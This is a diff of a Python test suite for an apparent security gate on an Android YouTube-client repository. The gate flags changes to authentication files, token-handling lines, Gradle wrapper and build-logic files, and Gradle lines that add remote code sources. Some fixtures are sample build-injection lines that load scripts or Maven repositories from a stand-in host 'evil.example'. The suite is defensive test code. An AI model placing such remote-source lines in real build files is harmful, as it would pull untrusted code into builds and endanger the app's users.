@@ -102,6 +102,19 @@ class AuthPaths(unittest.TestCase):
             "smarttubetv/src/main/java/com/liskovsoft/smartyoutubetv2/tv/ui/signin/SignInFragment.java",
             "smarttubetv/src/main/res/layout/fragment_signin.xml",
             "res/layout/sign_in_view.xml",
+            "youtubeapi/src/main/java/com/liskovsoft/youtubeapi/service/internal/YouTubeAccountManager.java",
+            "common/src/main/java/com/liskovsoft/smartyoutubetv2/common/prefs/AccountsData.java",
+            "common/src/main/java/com/liskovsoft/smartyoutubetv2/common/app/presenters/settings/AccountSettingsPresenter.java",
+            "app/AuthApi.java",
+            "app/AuthInterceptor.java",
+            "app/OAuthHelper.java",
+            "app/GoogleSigninService.java",
+            "app/TokenStore.kt",
+            "app/refresh_token.json",
+            "app/CredentialCache.java",
+            "app/LoginActivity.java",
+            "app/CookieJar.java",
+            "app/Authorization.java",
         ):
             self.assertTrue(logic.is_auth_path(path), path)
 
@@ -112,19 +125,74 @@ class AuthPaths(unittest.TestCase):
             "docs/author/README.md",
             "common/src/main/java/Video.java",
             "smarttubetv/build.gradle",
+            "youtubeapi/src/main/java/com/liskovsoft/youtubeapi/potoken/PoToken.kt",
+            "youtubeapi/src/main/assets/po_token.js",
+            "app/ChatItemAuthor.java",
+            "app/authors.txt",
         ):
             self.assertFalse(logic.is_auth_path(path), path)
 
 
-class Gitmodules(unittest.TestCase):
-    TEXT = '[submodule "SharedModules"]\n\tpath = SharedModules\n\turl = https://github.com/yuliskov/SharedModules\n' \
-           '[submodule "MediaServiceCore"]\n\tpath = MediaServiceCore\n\turl = https://github.com/yuliskov/MediaServiceCore\n'
+class TokenLines(unittest.TestCase):
+    def test_token_handling_terms(self):
+        for line in (
+            'mAccountManager.persistRefreshToken(token);',
+            'String refresh_token = json.get("refresh_token");',
+            'getAccessToken()',
+            'headers.put("Authorization", value);',
+            'private static final String CLIENT_SECRET = "x";',
+            'client_id=861556708454',
+            '"Bearer " + token',
+            'persistAccounts();',
+            'android:allowBackup="true"',
+            'android:dataExtractionRules="@xml/rules"',
+        ):
+            self.assertTrue(logic.is_token_line(line), line)
 
-    def test_parses_paths_and_urls(self):
-        self.assertEqual(logic.parse_gitmodules(self.TEXT), {
-            "SharedModules": ("SharedModules", "https://github.com/yuliskov/SharedModules"),
-            "MediaServiceCore": ("MediaServiceCore", "https://github.com/yuliskov/MediaServiceCore"),
-        })
+    def test_ordinary_lines(self):
+        for line in ("int x = 1;", "String poToken = next();", "authorName = v;", "tokenizer.next();"):
+            self.assertFalse(logic.is_token_line(line), line)
+
+
+class BuildLogic(unittest.TestCase):
+    def test_paths_that_always_stop(self):
+        for path in (
+            "gradle/wrapper/gradle-wrapper.jar",
+            "gradle/wrapper/gradle-wrapper.properties",
+            "gradlew",
+            "gradlew.bat",
+            "buildSrc/src/main/groovy/Plugin.groovy",
+            "buildSrc/build.gradle.kts",
+            "sub/buildSrc/x.kt",
+            "settings.gradle",
+            "settings.gradle.kts",
+            "core_settings.gradle",
+            "sub/settings-extra.gradle",
+            "gradle.properties",
+            "gradle/libs.versions.toml",
+        ):
+            self.assertTrue(logic.is_build_logic_path(path), path)
+
+    def test_ordinary_paths(self):
+        for path in ("smarttubetv/build.gradle", "docs/settings.md", "app/GradleInfo.java", "app/wrapper/Thing.java"):
+            self.assertFalse(logic.is_build_logic_path(path), path)
+
+    def test_lines_that_can_add_a_code_source(self):
+        for line in (
+            'apply from: "https://evil.example/x.gradle"',
+            "apply from: remoteScript",
+            "apply(from = rootProject.file(name))",
+            "project.getRepositories().maven { url repoUrl }",
+            "def repoUrl = 'https://evil.example/m2'",
+            'ext.mirror = "http://evil.example"',
+            "maven { url mirror }",
+            "url = uri(mirror)",
+        ):
+            self.assertTrue(logic.is_code_source_line(line), line)
+
+    def test_ordinary_gradle_lines(self):
+        for line in ("versionCode 2465", 'versionName "32.75"', "implementation 'a:b:1'", "minSdkVersion 21"):
+            self.assertFalse(logic.is_code_source_line(line), line)
 
 
 class Repositories(unittest.TestCase):
@@ -144,8 +212,8 @@ class Repositories(unittest.TestCase):
         self.assertTrue(logic.repository_declarations("repositories {\n  google()\n"))
 
 
-def diff(label="", paths=(), texts=None, compare=None):
-    return logic.RepoDiff(label, list(paths), texts or {}, compare)
+def diff(label="", paths=(), texts=None, lines=None, compare=None):
+    return logic.RepoDiff(label, list(paths), texts or {}, lines or {}, compare)
 
 
 class Gate(unittest.TestCase):
@@ -162,41 +230,59 @@ class Gate(unittest.TestCase):
         self.assertEqual(len(findings), 1)
         self.assertIn("MediaServiceCore/youtubeapi/x/auth/AuthApi.java", findings[0])
 
-    def test_gitmodules_url_change(self):
-        old = '[submodule "a"]\n\tpath = a\n\turl = https://x/a\n'
-        new = '[submodule "a"]\n\tpath = a\n\turl = https://evil/a\n'
-        self.assertEqual(len(logic.gate_findings([diff(paths=[".gitmodules"], texts={".gitmodules": (old, new)})])), 1)
-
-    def test_gitmodules_added_submodule(self):
-        old = '[submodule "a"]\n\tpath = a\n\turl = https://x/a\n'
-        new = old + '[submodule "b"]\n\tpath = b\n\turl = https://x/b\n'
-        self.assertEqual(len(logic.gate_findings([diff(paths=[".gitmodules"], texts={".gitmodules": (old, new)})])), 1)
-
-    def test_gitmodules_change_that_keeps_urls_passes(self):
-        old = '[submodule "a"]\n\tpath = a\n\turl = https://x/a\n'
-        new = '[submodule "a"]\n\tpath = a\n\turl = https://x/a\n\tbranch = main\n'
-        self.assertEqual(logic.gate_findings([diff(paths=[".gitmodules"], texts={".gitmodules": (old, new)})]), [])
+    def test_gitmodules_compare_the_normalized_text(self):
+        same = diff(paths=[".gitmodules"], texts={".gitmodules": ("a", "a")}, lines={".gitmodules": ["x"]})
+        changed = diff(paths=[".gitmodules"], texts={".gitmodules": ("a", "b")}, lines={".gitmodules": ["x"]})
+        self.assertEqual(logic.gate_findings([same]), [])
+        self.assertEqual(len(logic.gate_findings([changed])), 1)
 
     def test_gradle_repositories_change(self):
         old = "repositories { google() }\ndependencies { implementation 'a:b:1' }\n"
-        new = "repositories { google(); maven { url 'https://evil' } }\ndependencies { implementation 'a:b:1' }\n"
-        findings = logic.gate_findings([diff(paths=["build.gradle"], texts={"build.gradle": (old, new)})])
+        new = "repositories { google(); jcenter() }\ndependencies { implementation 'a:b:1' }\n"
+        findings = logic.gate_findings([diff(paths=["build.gradle"], texts={"build.gradle": (old, new)},
+                                             lines={"build.gradle": ["repositories { google(); jcenter() }"]})])
         self.assertEqual(len(findings), 1)
         self.assertIn("build.gradle", findings[0])
 
     def test_gradle_change_outside_repositories_passes(self):
         old = "repositories { google() }\nversionCode 1\n"
         new = "repositories { google() }\nversionCode 2\n"
-        self.assertEqual(logic.gate_findings([diff(paths=["build.gradle"], texts={"build.gradle": (old, new)})]), [])
+        findings = logic.gate_findings([diff(paths=["build.gradle"], texts={"build.gradle": (old, new)},
+                                             lines={"build.gradle": ["versionCode 1", "versionCode 2"]})])
+        self.assertEqual(findings, [])
 
     def test_gradle_rules_cover_submodules_too(self):
         texts = {"build.gradle": ("repositories { google() }\n", "repositories { jcenter() }\n")}
-        findings = logic.gate_findings([diff("MediaServiceCore", ["build.gradle"], texts)])
+        findings = logic.gate_findings([diff("MediaServiceCore", ["build.gradle"], texts, {"build.gradle": ["x"]})])
         self.assertIn("MediaServiceCore/build.gradle", findings[0])
+
+    def test_gradle_line_with_a_source_stops(self):
+        text = ("", "")
+        findings = logic.gate_findings([diff(paths=["a.gradle"], texts={"a.gradle": text},
+                                             lines={"a.gradle": ["def mirror = 'https://evil.example'"]})])
+        self.assertEqual(len(findings), 1)
+
+    def test_gradle_file_that_shows_no_lines_stops(self):
+        self.assertEqual(len(logic.gate_findings([diff(paths=["a.gradle"], texts={"a.gradle": ("", "")})])), 1)
+
+    def test_source_terms_only_count_in_gradle_files(self):
+        self.assertEqual(logic.gate_findings([diff(paths=["app/Main.java"],
+                                                   lines={"app/Main.java": ["url = 'https://example.org'"]})]), [])
+
+    def test_changed_line_with_a_token_term_stops(self):
+        findings = logic.gate_findings([diff("MediaServiceCore", ["app/Helper.java"],
+                                             lines={"app/Helper.java": ["x.setRefreshToken(y);"]})])
+        self.assertEqual(len(findings), 1)
+        self.assertIn("MediaServiceCore/app/Helper.java", findings[0])
+
+    def test_build_logic_path_stops(self):
+        self.assertEqual(len(logic.gate_findings([diff(paths=["gradle/wrapper/gradle-wrapper.jar"])])), 1)
 
     def test_is_gradle_file(self):
         for path in ("build.gradle", "smarttubetv/build.gradle", "settings.gradle", "a/b.gradle.kts"):
             self.assertTrue(logic.is_gradle_file(path), path)
+        self.assertTrue(logic.is_gradle_file("buildSrc/src/Plugin.groovy"))
+        self.assertTrue(logic.is_gradle_file("build/logic.kts"))
         self.assertFalse(logic.is_gradle_file("gradle.properties"))
 
 
